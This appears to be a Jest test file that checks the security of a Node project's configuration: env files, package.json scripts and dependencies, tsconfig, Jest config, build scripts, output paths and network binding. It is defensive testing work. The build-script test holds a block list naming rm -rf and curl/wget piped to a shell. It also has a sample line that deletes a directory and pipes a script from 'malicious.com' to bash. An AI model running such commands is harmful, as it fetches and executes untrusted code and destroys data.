/**
 * Configuration Security Tests
 * 
 * Tests for configuration security validation without complex dependencies
 */

const fs = require('fs');
const path = require('path');

describe('Configuration Security', () => {
  const projectRoot = path.resolve(__dirname, '../..');

  describe('Environment Configuration', () => {
    test('should validate environment configuration security', () => {
      const validateEnvConfig = (envContent) => {
        const issues = [];
        const lines = envContent.split('\n');

        for (const line of lines) {
          const trimmed = line.trim();
          if (!trimmed || trimmed.startsWith('#')) continue;

          if (trimmed.includes('=')) {
            const [key, value] = trimmed.split('=', 2);
            
            // Check for debug flags in production
            if (key.includes('DEBUG') && value === 'true') {
              issues.push(`Debug enabled: ${key}`);
            }

            // Check for insecure protocols
            if (value && (value.includes('http://') && !value.includes('localhost'))) {
              issues.push(`Insecure HTTP protocol: ${key}`);
            }

            // Check for default passwords
            if (key.toLowerCase().includes('password') && 
                ['password', '123456', 'admin', 'root'].includes(value.toLowerCase())) {
              issues.push(`Default password detected: ${key}`);
            }

            // Check for exposed ports
            if (value === '0.0.0.0') {
              issues.push(`Binding to all interfaces: ${key}`);
            }
          }
        }

        return issues;
      };

      const safeEnv = `
NODE_ENV=production
PORT=3000
API_URL=https://api.example.com
# Safe comment
`;

      const dangerousEnv = `
NODE_ENV=production
DEBUG=true
API_URL=http://api.example.com
PASSWORD=admin
HOST=0.0.0.0
`;

      expect(validateEnvConfig(safeEnv)).toHaveLength(0);
      expect(validateEnvConfig(dangerousEnv).length).toBeGreaterThan(0);
    });

    test('should detect missing required environment variables', () => {
      const checkRequiredEnvVars = (envContent, requiredVars) => {
        const definedVars = new Set();
        const lines = envContent.split('\n');

        for (const line of lines) {
          const trimmed = line.trim();
          if (trimmed && !trimmed.startsWith('#') && trimmed.includes('=')) {
            const [key] = trimmed.split('=', 2);
            definedVars.add(key);
          }
        }

        return requiredVars.filter(varName => !definedVars.has(varName));
      };

      const envContent = 'NODE_ENV=test\nPORT=3000';
      const required = ['NODE_ENV', 'PORT', 'API_KEY'];
      const missing = checkRequiredEnvVars(envContent, required);

      expect(missing).toContain('API_KEY');
      expect(missing).not.toContain('NODE_ENV');
    });
  });

  describe('Package.json Security', () => {
    test('should validate package.json exists and is secure', () => {
      const packagePath = path.join(projectRoot, 'package.json');
      expect(fs.existsSync(packagePath)).toBe(true);

      if (fs.existsSync(packagePath)) {
        const packageContent = fs.readFileSync(packagePath, 'utf8');
        let packageJson;

        expect(() => {
          packageJson = JSON.parse(packageContent);
        }).not.toThrow();

        // Basic security checks
        expect(packageJson.name).toBeDefined();
        expect(packageJson.version).toBeDefined();
        
        // Check for suspicious scripts
        if (packageJson.scripts) {
          const dangerousCommands = ['rm -rf', 'del /s', 'shutdown'];
          for (const [scriptName, command] of Object.entries(packageJson.scripts)) {
            if (typeof command === 'string') {
              for (const dangerous of dangerousCommands) {
                expect(command.toLowerCase()).not.toContain(dangerous);
              }
            }
          }
        }
      }
    });

    test('should validate dependency security patterns', () => {
      const validateDependencies = (dependencies) => {
        const issues = [];
        
        for (const [name, version] of Object.entries(dependencies || {})) {
          // Check for suspicious package names
          if (name.includes('..') || name.includes('/')) {
            issues.push(`Suspicious package name: ${name}`);
          }

          // Check for overly permissive versions
          if (typeof version === 'string' && version.startsWith('*')) {
            issues.push(`Wildcard version for ${name}: ${version}`);
          }

          // Check for pre-release versions in production
          if (typeof version === 'string' && 
              (version.includes('-alpha') || version.includes('-beta')) &&
              process.env.NODE_ENV === 'production') {
            issues.push(`Pre-release version in production: ${name}@${version}`);
          }
        }

        return issues;
      };

      const safeDeps = {
        'express': '^4.18.0',
        'jest': '^29.0.0'
      };

      const dangerousDeps = {
        '../malicious-package': '1.0.0',
        'express': '*',
        'experimental-lib': '1.0.0-alpha.1'
      };

      expect(validateDependencies(safeDeps)).toHaveLength(0);
      expect(validateDependencies(dangerousDeps).length).toBeGreaterThan(0);
    });
  });

  describe('TypeScript Configuration Security', () => {
    test('should validate tsconfig.json security settings', () => {
      const validateTsConfig = (tsConfigContent) => {
        let tsConfig;
        try {
          tsConfig = JSON.parse(tsConfigContent);
        } catch {
          return ['Invalid JSON format'];
        }

        const issues = [];
        const compilerOptions = tsConfig.compilerOptions || {};

        // Check for insecure compiler options
        if (compilerOptions.allowJs && compilerOptions.strict !== true) {
          issues.push('allowJs enabled without strict mode');
        }

        if (compilerOptions.suppressImplicitAnyIndexErrors === true) {
          issues.push('Implicit any index errors suppressed');
        }

        // Check for dangerous include/exclude patterns
        if (tsConfig.include && tsConfig.include.includes('**/*')) {
          if (!tsConfig.exclude || !tsConfig.exclude.includes('node_modules')) {
            issues.push('Overly broad include pattern without excluding node_modules');
          }
        }

        return issues;
      };

      const safeTsConfig = JSON.stringify({
        compilerOptions: {
          strict: true,
          noImplicitAny: true,
          allowJs: false
        },
        include: ['src/**/*'],
        exclude: ['node_modules', 'dist']
      });

      const dangerousTsConfig = JSON.stringify({
        compilerOptions: {
          strict: false,
          allowJs: true,
          suppressImplicitAnyIndexErrors: true
        },
        include: ['**/*']
      });

      expect(validateTsConfig(safeTsConfig)).toHaveLength(0);
      expect(validateTsConfig(dangerousTsConfig).length).toBeGreaterThan(0);
    });
  });

  describe('Jest Configuration Security', () => {
    test('should validate Jest configuration patterns', () => {
      const validateJestConfig = (jestConfig) => {
        const issues = [];

        // Check for dangerous test patterns
        if (jestConfig.testMatch) {
          for (const pattern of jestConfig.testMatch) {
            if (pattern.includes('node_modules') && !pattern.includes('!')) {
              issues.push(`Dangerous test pattern includes node_modules: ${pattern}`);
            }
          }
        }

        // Check for insecure setup files
        if (jestConfig.setupFilesAfterEnv) {
          for (const setupFile of jestConfig.setupFilesAfterEnv) {
            if (setupFile.includes('..') || setupFile.startsWith('/')) {
              issues.push(`Potentially unsafe setup file path: ${setupFile}`);
            }
          }
        }

        // Check for test environment security
        if (jestConfig.testEnvironment === 'jsdom') {
          if (!jestConfig.testEnvironmentOptions || 
              !jestConfig.testEnvironmentOptions.resources) {
            issues.push('jsdom environment without resource restrictions');
          }
        }

        return issues;
      };

      const safeJestConfig = {
        testEnvironment: 'node',
        testMatch: ['**/__tests__/**/*.test.js'],
        setupFilesAfterEnv: ['<rootDir>/jest.setup.js']
      };

      const dangerousJestConfig = {
        testEnvironment: 'jsdom',
        testMatch: ['**/node_modules/**/*.test.js'],
        setupFilesAfterEnv: ['../../../malicious-setup.js']
      };

      expect(validateJestConfig(safeJestConfig)).toHaveLength(0);
      expect(validateJestConfig(dangerousJestConfig).length).toBeGreaterThan(0);
    });
  });

  describe('Build Configuration Security', () => {
    test('should validate build script security', () => {
      const validateBuildScript = (script) => {
        const dangerousPatterns = [
          'rm -rf',
          'del /s',
          'format',
          'curl.*|.*bash',
          'wget.*|.*sh',
          'eval\\s*\\(',
          'exec\\s*\\('
        ];

        const issues = [];
        for (const pattern of dangerousPatterns) {
          const regex = new RegExp(pattern, 'i');
          if (regex.test(script)) {
            issues.push(`Dangerous pattern detected: ${pattern}`);
          }
        }

        return issues;
      };

      const safeBuildScript = 'tsc && node build.js';
      const dangerousBuildScript = 'rm -rf dist && curl malicious.com/script.sh | bash';

      expect(validateBuildScript(safeBuildScript)).toHaveLength(0);
      expect(validateBuildScript(dangerousBuildScript).length).toBeGreaterThan(0);
    });

    test('should check for secure output directories', () => {
      const validateOutputDir = (outputDir) => {
        const issues = [];

        // Check for dangerous output directories
        const dangerousPaths = ['/', '/usr', '/etc', '/var', '/bin'];
        if (dangerousPaths.some(dangerous => outputDir.startsWith(dangerous))) {
          issues.push(`Dangerous output directory: ${outputDir}`);
        }

        // Check for directory traversal
        if (outputDir.includes('..')) {
          issues.push(`Directory traversal in output path: ${outputDir}`);
        }

        // Check for absolute paths outside project
        if (path.isAbsolute(outputDir) && !outputDir.startsWith(process.cwd())) {
          issues.push(`Output directory outside project: ${outputDir}`);
        }

        return issues;
      };

      expect(validateOutputDir('./dist')).toHaveLength(0);
      expect(validateOutputDir('dist')).toHaveLength(0);
      expect(validateOutputDir('/usr/bin')).not.toHaveLength(0);
      expect(validateOutputDir('../../../system')).not.toHaveLength(0);
    });
  });

  describe('Network Configuration Security', () => {
    test('should validate network binding configuration', () => {
      const validateNetworkConfig = (config) => {
        const issues = [];

        // Check for insecure host binding
        if (config.host === '0.0.0.0' && config.environment === 'production') {
          issues.push('Binding to all interfaces in production');
        }

        // Check for default ports
        if (config.port && [80, 443, 22, 21, 25].includes(config.port)) {
          issues.push(`Using privileged/common port: ${config.port}`);
        }

        // Check for insecure protocols
        if (config.protocol === 'http' && config.environment === 'production') {
          issues.push('Using HTTP in production environment');
        }

        return issues;
      };

      const safeConfig = {
        host: 'localhost',
        port: 3000,
        protocol: 'https',
        environment: 'production'
      };

      const dangerousConfig = {
        host: '0.0.0.0',
        port: 80,
        protocol: 'http',
        environment: 'production'
      };

      expect(validateNetworkConfig(safeConfig)).toHaveLength(0);
      expect(validateNetworkConfig(dangerousConfig).length).toBeGreaterThan(0);
    });
  });
});